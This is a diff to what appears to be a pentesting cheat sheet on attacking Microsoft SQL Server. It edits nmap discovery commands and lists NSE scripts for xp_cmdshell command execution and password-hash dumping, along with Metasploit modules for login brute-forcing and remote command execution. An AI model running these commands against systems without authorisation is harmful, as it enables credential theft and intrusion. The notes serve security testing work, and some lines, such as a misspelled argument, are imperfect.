@@ -4,14 +4,14 @@ description: 'TCP/1433, UDP/1434'
 
 # MSSQL
 
-### nmap scans
+## Enumeration with nmap
 
 ```bash
-#use sql browser to find all
-nmap -sU -p 1434 -sV $range
+nmap -v -n -Pn -sU -p 1434 --open --oA report_mssql $range
+grep open report_mssql.gnmap | cut -d" " -f2 > hosts_mssql.txt
 ```
 
-### nmap scripts
+## Enumeration with NSE
 
 ```bash
 #all scripts
@@ -42,22 +42,13 @@ nmap -p 1433 --script ms-sql-xp-cmdshell.nse --scrip-args=ms-sql-xp-cmdshell='ne
 nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=$user $ip
 ```
 
-### metasploit
+## Metasploit
 
 ```bash
-msf> use auxiliary/scanner/mssql/mssql_ping
-msf> set RHOSTS $ip
-msf> run
-
-msf> use auxiliary/scanner/mssql/mssql_login
-msf> run
-
-msf> use auxiliary/scanner/mssql/mssql_enum
-msf> run
-
-msf> auxiliary(mssql_exec) > set CMD 'ipconfig'
-> run
-
-msf> auxiliary(mssql_run) > run
+> use auxiliary/scanner/mssql/mssql_ping
+> use auxiliary/scanner/mssql/mssql_login
+> use auxiliary/scanner/mssql/mssql_enum
+> auxiliary(mssql_exec) > set CMD 'ipconfig'
+> auxiliary(mssql_run) 
 ```
 
